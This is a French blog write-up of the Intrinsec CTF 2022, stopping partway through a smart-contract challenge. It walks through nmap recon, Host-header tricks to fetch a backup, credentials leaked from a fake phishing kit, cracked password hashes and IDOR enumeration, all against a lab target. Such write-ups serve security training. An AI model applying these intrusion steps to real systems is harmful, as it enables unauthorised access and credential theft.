<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8" />

  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <link rel="icon" href="/favicon.ico">

  <title>
    Writeup Intrinsec CTF 2022 | leHack 2022 Edition - Vozec&#39;s Blog
  </title>

  <meta name="description" content="Writeup complet de tous les challenges du Intrinsec CTF 2022" />
  <meta name="keywords" content="network,pivoting,ssh,ctf,Intrinsec,ctftime,unbreakable" />
  <meta name="generator" content="Hugo 0.105.0">

  <link rel="stylesheet" href="https://vozec.fr/css/main.css" />

  
  

  <meta property="og:title" content="Writeup Intrinsec CTF 2022 | leHack 2022 Edition" />
<meta property="og:description" content="Writeup complet de tous les challenges du Intrinsec CTF 2022" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://vozec.fr/writeups/intrinsec-ctf-lehack2022/" /><meta property="og:image" content="https://vozec.fr/vozec.png"/><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-06-30T12:00:00+00:00" />
<meta property="article:modified_time" content="2022-06-30T12:00:00+00:00" />



  <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://vozec.fr/vozec.png"/>

<meta name="twitter:title" content="Writeup Intrinsec CTF 2022 | leHack 2022 Edition"/>
<meta name="twitter:description" content="Writeup complet de tous les challenges du Intrinsec CTF 2022"/>


  <meta itemprop="name" content="Writeup Intrinsec CTF 2022 | leHack 2022 Edition">
<meta itemprop="description" content="Writeup complet de tous les challenges du Intrinsec CTF 2022"><meta itemprop="datePublished" content="2022-06-30T12:00:00+00:00" />
<meta itemprop="dateModified" content="2022-06-30T12:00:00+00:00" />
<meta itemprop="wordCount" content="4469"><meta itemprop="image" content="https://vozec.fr/vozec.png"/>
<meta itemprop="keywords" content="network,tuto," />

  <meta itemprop="name" content="Writeup Intrinsec CTF 2022 | leHack 2022 Edition">
<meta itemprop="description" content="Writeup complet de tous les challenges du Intrinsec CTF 2022"><meta itemprop="datePublished" content="2022-06-30T12:00:00+00:00" />
<meta itemprop="dateModified" content="2022-06-30T12:00:00+00:00" />
<meta itemprop="wordCount" content="4469"><meta itemprop="image" content="https://vozec.fr/vozec.png"/>
<meta itemprop="keywords" content="network,tuto," />
</head><body class="flex relative h-full min-h-screen"><aside
  class="will-change-transform transform transition-transform -translate-x-full absolute top-0 left-0 md:relative md:translate-x-0 w-3/4 md:w-60 h-full min-h-screen p-3 bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 flex flex-col gap-2.5 z-20 sidebar">
  <p class="font-bold mb-5 flex items-center gap-2">
    <button aria-label="Close sidebar"
      class="md:hidden menu-trigger-close p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-6 w-6" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
  fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" />
  <line x1="18" y1="6" x2="6" y2="18" />
  <line x1="6" y1="6" x2="18" y2="18" />
</svg></button>
    <a href="https://vozec.fr/" class="px-2">
      <span>Vozec&#39;s Blog</span>
    </a>
    <button aria-label="Toggle dark mode"
      class="dark-mode-toggle p-2 rounded border dark:border-slate-700 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
  fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" />
  <circle cx="12" cy="12" r="4" />
  <path d="M3 12h1M12 3v1M20 12h1M12 20v1M5.6 5.6l.7 .7M18.4 5.6l-.7 .7M17.7 17.7l.7 .7M6.3 17.7l-.7 .7" />
</svg></button>
  </p>

  
  <ul class="list-none flex flex-col gap-1">
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/" >
        <span>Home</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  text-slate-400 font-semibold pb-0 pl-1 border-b cursor-default pointer-events-none "
        href="#" >
        <span>C͟o͟n͟t͟e͟n͟t͟ ✒️</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles" >
        <span> 〰️ Articles</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/writeups" >
        <span> 〰️ Writeups</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  text-slate-400 font-semibold pb-0 pl-1 border-b cursor-default pointer-events-none "
        href="#" >
        <span>F͟r͟o͟m͟ 0 T͟o͟ C͟r͟y͟p͟t͟o͟ 🔐</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/crypto-rsa" >
        <span> 〰️ Rsa Courses</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/crypto-aes" >
        <span> 〰️ Aes Courses</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/crypto-other" >
        <span> 〰️ Other Courses</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  text-slate-400 font-semibold pb-0 pl-1 border-b cursor-default pointer-events-none "
        href="#" >
        <span>A͟b͟o͟u͟t͟ M͟e͟👀</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/contact" >
        <span> 〰️ Contact Me</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="https://flag-poisoning.fr"  target="_blank"
        rel="noopener" >
        <span> 〰️ My Ctf Team </span>
        
        <span><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
  fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" />
  <path d="M11 7h-5a2 2 0 0 0 -2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2 -2v-5" />
  <line x1="10" y1="14" x2="20" y2="4" />
  <polyline points="15 4 20 4 20 9" />
</svg></span>
        
      </a>
    </li>
    
  </ul>

  <div class="flex-1"></div>

  

  <ul class="list-none flex flex-wrap justify-center gap-1 pt-2 border-t border-slate-200 dark:border-slate-600">
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="https://twitter.com/Vozec1" target="_blank" rel="noopener noreferrer">
        <span class="sr-only">Twitter</span>
        
        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
  stroke-linecap="round" stroke-linejoin="round">
  <path
    d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z" />
</svg></span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="https://github.com/Vozec" target="_blank" rel="noopener noreferrer">
        <span class="sr-only">GitHub</span>
        
        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
  stroke-linecap="round" stroke-linejoin="round">
  <path
    d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />
</svg></span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="https://www.linkedin.com/in/arthur-deloffre-844b7a221/" target="_blank" rel="noopener noreferrer">
        <span class="sr-only">LinkedIn</span>
        
        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
  stroke-linecap="round" stroke-linejoin="round">
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z" />
  <rect x="2" y="9" width="4" height="12" />
  <circle cx="4" cy="4" r="2" />
</svg></span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="mailto:arthursd444@gmail.com" target="_blank" rel="noopener noreferrer">
        <span class="sr-only">Email</span>
        
        <span><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
  fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" />
  <rect x="3" y="5" width="18" height="14" rx="2" />
  <polyline points="3 7 12 13 21 7" />
</svg></span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="https://www.instagram.com/arthur_dlfr/" target="_blank" rel="noopener noreferrer">
        <span class="sr-only">Instagram</span>
        
        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
  stroke-linecap="round" stroke-linejoin="round">
  <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
  <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
  <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
</svg></span>
        
      </a>
    </li>
    
  </ul>
</aside>

<div
  class="fixed bg-slate-700 bg-opacity-5 transition duration-200 ease-in-out inset-0 z-10 pointer-events-auto md:hidden left-0 top-0 w-full h-full hidden menu-overlay">
</div>

<button aria-label="Toggle Sidebar"
  class="md:hidden absolute top-3 left-3 z-10 menu-trigger p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-100"><svg class="h-6 w-6" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
  fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" />
  <line x1="4" y1="6" x2="20" y2="6" />
  <line x1="4" y1="12" x2="20" y2="12" />
  <line x1="4" y1="18" x2="16" y2="18" />
</svg></button>
<div class="flex-1">




<div class="flex max-h-screen relative overflow-y-auto h-full">
  
  <article class="px-6 py-20 w-full mx-auto prose lg:prose-lg dark:prose-invert h-fit prose-img:mx-auto">
    
    <a href="https://vozec.fr/writeups/" class="!no-underline !text-slate-500 !mb-2 !inline-block !font-normal !text-sm hover:!text-slate-700 dark:hover:!text-slate-400">← Back to list</a>

    
    <h1 class="!mb-2">Writeup Intrinsec CTF 2022 | leHack 2022 Edition</h1>
    
    <p class="text-sm text-slate-500 !mb-8">June 30, 2022</p>
    

    

    <h1 id="description">Description</h1>
<p>Ce CTF est proposé par <a href="https://www.intrinsec.com/"  target="_blank" rel="noopener" >Intrinsec</a> , crée par <a href="https://twitter.com/th1b4ud"  target="_blank" rel="noopener" >Th1b4ud</a> et est constitué de <code>12 Challenges</code>.
On évolue tout au long des objectifs dans un réseau afin de compromettre toutes les machines les unes après les autres.</p>
<h1 id="thèmes">Thèmes</h1>
<ul>
<li>Web</li>
<li>Pivoting</li>
<li>Blockchain (SmartContract)</li>
<li>Forensic</li>
</ul>
<h1 id="prérequis">Prérequis</h1>
<ul>
<li>Du temps</li>
<li>Un vps de préférence</li>
<li>Connaissance basique de CTF</li>
</ul>
<p>*J&rsquo;ai appris beaucoup de choses pendant la compétition et c&rsquo;est assez facile à comprendre en faisant les challenges en parallèles. *</p>
<h1 id="misc-intro--2-challenges">MISC <em>(Intro : 2 Challenges)</em></h1>
<h2 id="discord">Discord</h2>
<ul>
<li><strong>Nom</strong>  : Discord</li>
<li><strong>Point</strong> : 1</li>
<li><strong>Description</strong> : Have you visited our wonderful discord server ? :) <a href="https://discord.gg/p8z4dCtAtk"  target="_blank" rel="noopener" >https://discord.gg/p8z4dCtAtk</a></li>
</ul>
<h6 id="solution-">Solution :</h6>
<p>On se rend sur leur Discord. On va dans la section <code>general</code>. Le flag est en haut de l&rsquo;écran :</p>
<pre tabindex="0"><code>Mayve this string will help you : ISEC{1l0v3D1sc0rd}
</code></pre><hr>
<h2 id="rules">Rules</h2>
<ul>
<li><strong>Nom</strong>  : Rules</li>
<li><strong>Point</strong> : 1</li>
<li><strong>Description</strong> :Have you read the rules?</li>
</ul>
<h6 id="solution--1">Solution :</h6>
<p>On se rend sur la page <a href="https://challenge.intrinsec.io/rules"  target="_blank" rel="noopener" >/rules</a> puis on inspecte le code la page .</p>
<pre tabindex="0"><code>&lt;!-- Good boy here your flag : ISEC{Ir34d3v3ryth1ng!} --&gt;
</code></pre><h1 id="main-objective-6-challenges">MAIN OBJECTIVE <em>(6 Challenges)</em></h1>
<h2 id="first-">First !</h2>
<ul>
<li><strong>Nom</strong>  : &ldquo;1 First !&rdquo;</li>
<li><strong>Point</strong> : 10</li>
<li><strong>Description</strong> :
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Our analysts found this IP : 20.126.99.66.
</span></span><span style="display:flex;"><span>We are convinced that this address is part of their infrastructure. See <span style="color:#ff79c6">if</span> it is not possible to enter through there.
</span></span></code></pre></div></li>
</ul>
<h6 id="solution--2">Solution :</h6>
<p>La première chose à faire est de lancer un nmap sur l&rsquo;ip :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c
</span></span><span style="display:flex;"><span>➜   nmap 20.126.99.66
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>PORT     STATE    SERVICE
</span></span><span style="display:flex;"><span>22/tcp   open     ssh
</span></span><span style="display:flex;"><span>80/tcp   open     http
</span></span><span style="display:flex;"><span>3000/tcp open     ppp
</span></span><span style="display:flex;"><span>8000/tcp open     http-alt
</span></span></code></pre></div><p>On peut se rendre sur les 3 pages des 3 derniers ports. Le premier étant un ssh pour l&rsquo;administration du CTF :</p>
<p><img src="./img/1_port.png" alt="AltText"></p>
<p>On a :</p>
<ul>
<li>Une page <strong>qui ressemble à une page de Microsoft office</strong></li>
<li>Un login pour une banque</li>
<li>Un PhpMyAdmin</li>
</ul>
<p>On trouve un <code>robots.txt</code> sur le port <strong>80</strong>.</p>
<pre tabindex="0"><code>Flag-1 : ISEC{h0_y0u_F0und_M3!}
</code></pre><hr>
<h2 id="bad-practices">Bad practices</h2>
<ul>
<li><strong>Nom</strong>  : Bad practices</li>
<li><strong>Point</strong> : 20</li>
<li><strong>Description</strong> : They don&rsquo;t seem to use good practices.</li>
</ul>
<h6 id="solution--3">Solution :</h6>
<p>En inspectant la page sur le <code>port 80</code>, on se rend compte de deux choses :</p>
<ul>
<li>Ce texte <code>&lt;!-- &lt;meta name=&quot;dev-platform&quot; content=&quot;dev.phishing.lan&quot;&gt; --&gt;</code></li>
<li>Ce Code <code>&lt;form method=&quot;GET&quot; action=&quot;../../harvester.php&quot; name=&quot;LoginForm&quot; autocomplete=&quot;off&quot;&gt;</code></li>
</ul>
<p>Ce site est en réalité une fausse page !
Essayons de regarder ce qu&rsquo;il se passe si on spécifie un <code>Host</code> en Header en lui mettant la valeur  <code>dev.phishing.lan</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl 20.126.99.66 &gt; original.html
</span></span><span style="display:flex;"><span>curl 20.126.99.66 -H <span style="color:#f1fa8c">&#39;Host:dev.phishing.lan&#39;</span> &gt; original_with_header.html
</span></span><span style="display:flex;"><span>diff original.html original_with_header.html
</span></span></code></pre></div><p>Résultat :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;!-- Dev version. Remove backup files and /pages directory before move to production. Ty --&gt;
</span></span></code></pre></div><p>Super ! On apprend l&rsquo;existence d&rsquo;une backup !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl 20.126.99.66/backup/backup -H <span style="color:#f1fa8c">&#39;Host:dev.phishing.lan&#39;</span>
</span></span></code></pre></div><p>Résultat :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span><span style="color:#8be9fd;font-style:italic">BACKUPTIME</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">`</span>date +%b-%d-%y<span style="color:#f1fa8c">`</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">RANDOM_STRING</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">`</span>head /dev/urandom | tr -dc a-f0-9 | head -c 40<span style="color:#f1fa8c">`</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">DESTINATION</span><span style="color:#ff79c6">=</span>backup-<span style="color:#f1fa8c">&#39;$BACKUPTIME&#39;</span>-<span style="color:#f1fa8c">&#39;$RANDOM_STRING&#39;</span>.tar.gz
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">SOURCEFOLDER</span><span style="color:#ff79c6">=</span>.
</span></span><span style="display:flex;"><span>tar -cpzf <span style="color:#8be9fd;font-style:italic">$DESTINATION</span> <span style="color:#8be9fd;font-style:italic">$SOURCEFOLDER</span>
</span></span></code></pre></div><p>Il y a ici un problème dans le script , <code>RANDOM_STRING</code> et <code>BACKUPTIME</code> ne sont pas exécutés , elles sont entre <code>`</code> .
On peut donc aller chercher la backup !:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -H <span style="color:#f1fa8c">&#39;Host:dev.phishing.lan&#39;</span> <span style="color:#f1fa8c">&#39;http://20.126.99.66/backup/backup-$BACKUPTIME-$RANDOM_STRING.tar.gz&#39;</span>*
</span></span></code></pre></div><p>Dedans on trouve :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#bd93f9">1</span> root root 127K Feb <span style="color:#bd93f9">10</span>  <span style="color:#bd93f9">2020</span> aad.login.js
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">211</span> Feb <span style="color:#bd93f9">28</span>  <span style="color:#bd93f9">2020</span> backup
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#bd93f9">1</span> root root  11K Feb <span style="color:#bd93f9">10</span>  <span style="color:#bd93f9">2020</span> favicon_a.ico
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">32</span> Feb <span style="color:#bd93f9">28</span>  <span style="color:#bd93f9">2020</span> flag.txt
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">632</span> Feb <span style="color:#bd93f9">12</span>  <span style="color:#bd93f9">2020</span> harvester.php
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#bd93f9">1</span> root root 7.3K Feb <span style="color:#bd93f9">12</span>  <span style="color:#bd93f9">2020</span> index.php
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#bd93f9">1</span> root root  85K Feb <span style="color:#bd93f9">10</span>  <span style="color:#bd93f9">2020</span> jquery.1.5.1.min.js
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#bd93f9">1</span> root root  85K Feb <span style="color:#bd93f9">10</span>  <span style="color:#bd93f9">2020</span> jquery.1.5.1.min.js.1
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#bd93f9">1</span> root root 8.5K Feb <span style="color:#bd93f9">10</span>  <span style="color:#bd93f9">2020</span> jquery.easing.1.3.js
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#bd93f9">1</span> root root  26K Feb <span style="color:#bd93f9">10</span>  <span style="color:#bd93f9">2020</span> login.ltr.css
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#bd93f9">1</span> root root 9.4K Feb <span style="color:#bd93f9">10</span>  <span style="color:#bd93f9">2020</span> logon.css
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">1</span> root root 4.0K Jun <span style="color:#bd93f9">30</span> 14:02 pages
</span></span></code></pre></div><p>On obtient un 2nd Flag :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c
</span></span><span style="display:flex;"><span>➜   cat flag.txt
</span></span><span style="display:flex;"><span>Flag-2 : ISEC<span style="color:#ff79c6">{</span>B4d_d3V_pR4cT1c3<span style="color:#ff79c6">}</span>
</span></span></code></pre></div><hr>
<h2 id="starting-to-smell-good">Starting to smell good</h2>
<ul>
<li><strong>Nom</strong>  : Starting to smell good&hellip;</li>
<li><strong>Point</strong> : 20</li>
<li><strong>Description</strong> : Can&rsquo;t you get more things?</li>
</ul>
<h6 id="solution--4">Solution :</h6>
<p>Le contenu du fichier <code>harvester.php</code> est intéressant :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/a
</span></span><span style="display:flex;"><span>➜   cat harvester.php
</span></span><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$dbuser</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;user&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$servername</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;db&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$dbpass</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;x0oKWidv0cz&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$dbname</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;phishing&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$redirect</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://outlook.office365.com&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$conn</span> <span style="color:#ff79c6">=</span> mysqli_connect<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$servername</span>, <span style="color:#8be9fd;font-style:italic">$dbuser</span>, <span style="color:#8be9fd;font-style:italic">$dbpass</span>, <span style="color:#8be9fd;font-style:italic">$dbname</span><span style="color:#ff79c6">)</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$password</span> <span style="color:#ff79c6">=</span> mysqli_real_escape_string<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$conn</span>, <span style="color:#8be9fd;font-style:italic">$_GET</span><span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#39;password&#39;</span><span style="color:#ff79c6">])</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$email</span> <span style="color:#ff79c6">=</span> mysqli_real_escape_string<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$conn</span>, <span style="color:#8be9fd;font-style:italic">$_GET</span><span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#39;email&#39;</span><span style="color:#ff79c6">])</span>;
</span></span></code></pre></div><p>Grâce à ces Creds , on peut aller se connecter sur le MySql sur le port 8000 et ainsi obtenir le flag dans la DB :)</p>
<p><img src="./img/mysql.png" alt="AltText"></p>
<hr>
<h2 id="strange-bank">Strange bank</h2>
<ul>
<li><strong>Nom</strong>  : Strange bank</li>
<li><strong>Point</strong> : 50</li>
<li><strong>Description</strong> : Perfect! Their base is well filled out good work. We are sure they have more secrets.</li>
</ul>
<h6 id="solution--5">Solution :</h6>
<p>Depuis le Mysql , on peut récupérer 3 utilisateurs dans la base de données :
on peut décoder les mots de passe avec <a href="https://crackstation.net/"  target="_blank" rel="noopener" >CrackStation</a>.</p>
<pre tabindex="0"><code>1 	wtivers 	57024125b8d8c3f6d69f99d7b42e63a71b0bb3f8 : &#39;phishing&#39;   (first test account)
2 	operator1 ffcbd03577964f021cc34f50fabb7b16094a4051 : &#39;operator1234&#39; 	(operator1 old account)
3 	jbura    	9bc34549d565d9505b287de0cd20ac77be1d3f2c : &#39;test1234&#39; 	(second test account)
</code></pre><p>On se connecte Ainsi sur le login du port <code>3000</code> avec ces Creds :</p>
<p><img src="./img/page_contract.png" alt="AltText"></p>
<p>On peut voir ici que c&rsquo;est un chall de Crypto .</p>
<p>On a :</p>
<ul>
<li>Le code d&rsquo;un SmartContract</li>
<li>Un bouton pour télécharger le code</li>
<li>Un bouton pour Déployer le SmartContract</li>
</ul>
<p>On peut inspecter les requêtes avec <a href="https://portswigger.net/burp"  target="_blank" rel="noopener" >&lt;code&gt;BurpSuite&lt;/code&gt;</a></p>
<p>Pour télécharger le contrat, on a :</p>
<pre tabindex="0"><code>GET /contract/1 HTTP/1.1
Host: 20.126.99.66:3000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://20.126.99.66:3000/refund
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
</code></pre><p>Il y a une faille de type <a href="https://portswigger.net/web-security/access-control/idor"  target="_blank" rel="noopener" >&lt;code&gt;IDOR&lt;/code&gt;</a> sur cette page. En effet, on peut modifier l&rsquo;indice, le <code>1</code> de l&rsquo;url pour obtenir un autre objet.
On peut donc énumérer les différents contrats grâce à l&rsquo;intruder de Burpsuite.</p>
<p><img src="./img/idor1.png" alt="AltText"></p>
<p>On obtient ainsi le code de <code>5</code> nouveaux contrats !
Le numéro <strong>13</strong> est intéressant:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pragma solidity &gt;<span style="color:#ff79c6">=</span>0.4.22 &lt;0.6.0;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>contract Refund <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    bool public <span style="color:#8be9fd;font-style:italic">admin</span> <span style="color:#ff79c6">=</span> false;
</span></span><span style="display:flex;"><span>    uint256 public funds;
</span></span><span style="display:flex;"><span>    bytes32 private <span style="color:#8be9fd;font-style:italic">hash</span> <span style="color:#ff79c6">=</span> 0x47a89f5ed7e6445e71adde201113005941232bcadade8ce112f6ef671038be04;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    constructor<span style="color:#ff79c6">()</span> public payable <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">funds</span> <span style="color:#ff79c6">=</span> funds + msg.value;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
